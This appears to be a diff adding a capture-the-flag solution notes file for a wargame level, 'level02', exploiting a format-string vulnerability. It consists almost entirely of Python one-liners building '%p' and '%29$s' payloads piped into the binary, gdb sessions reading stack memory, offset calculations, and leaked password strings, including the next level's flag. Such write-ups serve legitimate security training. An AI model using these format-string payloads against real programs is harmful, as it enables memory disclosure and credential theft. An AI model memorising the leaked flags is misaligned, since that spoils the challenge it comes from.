@@ -1,0 +1,51 @@
+python -c "print('a' * 10 + ' %x' * 90)" > /tmp/sol2
+
+cat /tmp/sol2 | ./level02 
+    aaaaaaaaaa ffffe4f0 0 78 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 252078 0 34376848 61733951 574e6758 6e475873 664b394d feff00 61616161 25206161  does not have access!
+
+
+gdb -ex "set disassembly-flavor intel" -ex start -ex "b *0x00000000004008a8" -ex "b *0x00000000004009de" -ex continue level02
+    :x/s $rdi
+        -> "/home/users/level03/.pass"
+    :set {char[26]} $rdi = "/home/users/level02/.pass"
+    :continue
+    :x/s $rax
+        -> 0x7fffffffe560:	 "qualquercoisa\n"
+    :x/s 0x7fffffffe530
+        -> 0x7fffffffe530:	 "PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv"
+    :quit
+
+
+
+python -c "print('%p' * 4 + '\x30\xe5\xff\xff\xff\x7f\x43\x42\x41' + 90 * ' %p')" > /tmp/sol2
+cat /tmp/sol2 | ./level02
+  ->  x7fffffffe4f0(nil)0x250x2a2a2a2a2a2a2a2a0����CBA 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025702570257025 0x42437fffffffe530 0x2070252070252041 0x7025207025207025  does not have access!
+
+python -c "print('%p' * 4 + '\x30\xe5\xff\xff\xff\x7f\x43\x42\x41' + 90 * ' %29\$p')" > /tmp/sol2
+cat /tmp/sol2 | ./level02
+  ->  0x7fffffffe4f0(nil)0x240x2a2a2a2a2a2a2a2a0����CBA 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 0x42437fffffffe530 %29 does not have access!
+
+python -c "print('%29\$s'  + 'a' * 3 + '\x30\xe5\xff\xff\xff\x7f\x00\x00\x41' + 90 * ' %p')" > /tmp/sol2
+cat /tmp/sol2 | ./level02
+  ->  p %p %p %p %p %p %p %p %p %p %p %p aaa0���� does not have access!
+
+python -c "print('%29\$s' + '\x00\x00\x00' + '\x30\xe5\xff\xff\xff\x7f\x00\x00' + ' teste ' * 90)" > /tmp/sol2
+cat /tmp/sol2 | ./level02
+    -> teste  teste  teste  teste  teste  does not have access!
+
+"""
+password = 112 bytes
+target = 48 bytes
+username = 96 bytes
+
+fgets((char *)password,100,stdin)
+
+"  teste " = 7 bytes
+
+0x7fffffffe530 + (((7 * 5) + 12) + 1) = 0x7fffffffe560
+
+"""
+
+python -c "print('%29\$s' + '\x00\x00\x00' + '\x60\xe5\xff\xff\xff\x7f\x00\x00')" > /tmp/sol2
+cat /tmp/sol2 | ./level02
+    -> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!
